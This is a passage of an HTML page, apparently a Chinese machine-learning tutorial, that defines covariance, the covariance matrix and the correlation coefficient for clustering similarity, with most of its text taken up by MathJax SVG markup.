d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mo" transform="translate(16904.2,0)"><path data-c="2026" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60ZM525 60Q525 84 542 102T585 120Q609 120 627 104T646 61Q646 36 629 18T586 0T543 17T525 60ZM972 60Q972 84 989 102T1032 120Q1056 120 1074 104T1093 61Q1093 36 1076 18T1033 0T990 17T972 60Z"></path></g><g data-mml-node="mo" transform="translate(18242.8,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(18687.5,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="TeXAtom" transform="translate(605,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(878,0)"><path data-c="1D457" d="M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z"></path></g></g></g><g data-mml-node="msup" transform="translate(20254.7,0)"><g data-mml-node="mo"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="TeXAtom" transform="translate(422,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="54" d="M36 443Q37 448 46 558T55 671V677H666V671Q667 666 676 556T685 443V437H645V443Q645 445 642 478T631 544T610 593Q593 614 555 625Q534 630 478 630H451H443Q417 630 414 618Q413 616 413 339V63Q420 53 439 50T528 46H558V0H545L361 3Q186 1 177 0H164V46H194Q264 46 283 49T309 63V339V550Q309 620 304 625T271 630H244H224Q154 630 119 601Q101 585 93 554T81 486T76 443V437H36V443Z"></path></g></g></g></g></g></svg></mjx-container>。</p><p>协方差的计算公式被定义为：</p><script type="math/tex; mode=display">\sigma(x,y)=\frac1{n-1}\sum_{i=1}^n(x_i-\overline x)(y_i-\overline y)</script><p>其中n表示样本数量，<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.464ex" xmlns="http://www.w3.org/2000/svg" width="3.431ex" height="2.181ex" role="img" focusable="false" viewBox="0 -759 1516.7 964"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mover"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mo" transform="translate(0,374)"><svg width="572" height="237" x="0" y="148" viewBox="143 148 572 237"><path data-c="2013" d="M0 248V285H499V248H0Z" transform="scale(1.716,1)"></path></svg></g></g><g data-mml-node="mo" transform="translate(572,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mover" transform="translate(1016.7,0)"><g data-mml-node="mi" transform="translate(5,0)"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(0,374)"><path data-c="2013" d="M0 248V285H499V248H0Z"></path></g></g></g></g></svg></mjx-container>分别表示两个随机变量所对应的观测样本均值。</p><p>样本<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.439ex" xmlns="http://www.w3.org/2000/svg" width="12.924ex" height="1.439ex" role="img" focusable="false" viewBox="0 -442 5712.5 636"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mn" transform="translate(605,-150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="mo" transform="translate(1008.6,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(1453.2,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mn" transform="translate(605,-150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(2461.8,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mo" transform="translate(2906.4,0)"><path data-c="2026" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60ZM525 60Q525 84 542 102T585 120Q609 120 627 104T646 61Q646 36 629 18T586 0T543 17T525 60ZM972 60Q972 84 989 102T1032 120Q1056 120 1074 104T1093 61Q1093 36 1076 18T1033 0T990 17T972 60Z"></path></g><g data-mml-node="mo" transform="translate(4245.1,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(4689.8,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mi" transform="translate(605,-150) scale(0.707)"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g></g></g></g></svg></mjx-container>的协方差矩阵定义为：</p><script type="math/tex; mode=display">\begin{pmatrix}\sigma(x_1,x_1)&\cdots&\sigma(x_1,x_d)\\\vdots&\ddots&\vdots\\\sigma(x_d,x_1)&\cdots&\sigma(x_d,x_d)\\\end{pmatrix}\in \R^{d×d}</script><p>如果协方差矩阵是单位矩阵，马哈拉诺比斯距离就简化为欧氏距离。</p><h3 id="9-1-3-相关系数"><a href="#9-1-3-相关系数" class="headerlink" title="9.1.3 相关系数"></a>9.1.3 相关系数</h3><p>相关系数的绝对值越接近于1，表示样本越相似；越接近于0，表示样本越不相似。</p><p>样本<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.357ex" xmlns="http://www.w3.org/2000/svg" width="2.034ex" height="1.357ex" role="img" focusable="false" viewBox="0 -442 899 599.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mi" transform="translate(605,-150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g></g></g></svg></mjx-container>与样本<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.666ex" xmlns="http://www.w3.org/2000/svg" width="2.141ex" height="1.666ex" role="img" focusable="false" viewBox="0 -442 946.3 736.2"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mi" transform="translate(605,-150) scale(0.707)"><path data-c="1D457" d="M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z"></path></g></g></g></g></svg></mjx-container>之间的相关系数定义为：</p><script type="math/tex; mode=display">r_{ij}=\frac{\sum_{k=1}^m(x_{ki}-\overline x_i)(x_{kj}-\overline x_j)}{[\sum_{k=1}^m(x_{ki}-\overline x_i)^2\sum_{k=1}^m(x_{kj}-\overline x_j)^2]^\frac12}</script><p>其中<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.798ex" xmlns="http://www.w3.org/2000/svg" width="34.275ex" height="2.755ex" role="img" focusable="false" viewBox="0 -864.9 15149.7 1217.7"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mover"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mo" transform="translate(0,374)"><svg width="572" height="237" x="0" y="148" viewBox="143 148 572 237"><path data-c="2013" d="M0 248V285H499V248H0Z" transform="scale(1.716,1)"></path></svg></g></g><g data-mml-node="mi" transform="translate(605,-150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(1176.7,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mfrac" transform="translate(2232.5,0)"><g data-mml-node="mn" transform="translate(353.6,394) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mi" transform="translate(220,-345) scale(0.707)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><rect width="820.8" height="60" x="120" y="220"></rect></g><g data-mml-node="munderover" transform="translate(3460,0)"><g data-mml-node="mo"><path data-c="2211" d="M61 748Q64 750 489 750H913L954 640Q965 609 976 579T993 533T999 516H979L959 517Q936 579 886 621T777 682Q724 700 655 705T436 710H319Q183 710 183 709Q186 706 348 484T511 259Q517 250 513 244L490 216Q466 188 420 134T330 27L149 -187Q149 -188 362 -188Q388 -188 436 -188T506 -189Q679 -189 778 -162T936 -43Q946 -27 959 6H999L913 -249L489 -250Q65 -250 62 -248Q56 -246 56 -239Q56 -234 118 -161Q186 -81 245 -11L428 206Q428 207 242 462L57 717L56 728Q56 744 61 748Z"></path></g><g data-mml-node="mi" transform="translate(1089,477.1) scale(0.707)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="TeXAtom" transform="translate(1089,-285.4) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D458" d="M121 647Q121 657 125 670T137 683Q138 683 209 688T282 694Q294 694 294 686Q294 679 244 477Q194 279 194 272Q213 282 223 291Q247 309 292 354T362 415Q402 442 438 442Q468 442 485 423T503 369Q503 344 496 327T477 302T456 291T438 288Q418 288 406 299T394 328Q394 353 410 369T442 390L458 393Q446 405 434 405H430Q398 402 367 380T294 316T228 255Q230 254 243 252T267 246T293 238T320 224T342 206T359 180T365 147Q365 130 360 106T354 66Q354 26 381 26Q429 26 459 145Q461 153 479 153H483Q499 153 499 144Q499 139 496 130Q455 -11 378 -11Q333 -11 305 15T277 90Q277 108 280 121T283 145Q283 167 269 183T234 206T200 217T182 220H180Q168 178 159 139T145 81T136 44T129 20T122 7T111 -2Q98 -11 83 -11Q66 -11 57 -1T48 16Q48 26 85 176T158 471L195 616Q196 629 188 632T149 637H144Q134 637 131 637T124 640T121 647Z"></path></g><g data-mml-node="mo" transform="translate(521,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(1299,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g><g data-mml-node="msub" transform="translate(6037.8,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="TeXAtom" transform="translate(605,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D458" d="M121 647Q121 657 125 670T137 683Q138 683 209 688T282 694Q294 694 294 686Q294 679 244 477Q194 279 194 272Q213 282 223 291Q247 309 292 354T362 415Q402 442 438 442Q468 442 485 423T503 369Q503 344 496 327T477 302T456 291T438 288Q418 288 406 299T394 328Q394 353 410 369T442 390L458 393Q446 405 434 405H430Q398 402 367 380T294 316T228 255Q230 254 243 252T267 246T293 238T320 224T342 206T359 180T365 147Q365 130 360 106T354 66Q354 26 381 26Q429 26 459 145Q461 153 479 153H483Q499 153 499 144Q499 139 496 130Q455 -11 378 -11Q333 -11 305 15T277 90Q277 108 280 121T283 145Q283 167 269 183T234 206T200 217T182 220H180Q168 178 159 139T145 81T136 44T129 20T122 7T111 -2Q98 -11 83 -11Q66 -11 57 -1T48 16Q48 26 85 176T158 471L195 616Q196 629 188 632T149 637H144Q134 637 131 637T124 640T121 647Z"></path></g><g data-mml-node="mi" transform="translate(521,0)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g></g><g data-mml-node="mo" transform="translate(7305.1,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(7749.8,0)"><g data-mml-node="mover"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 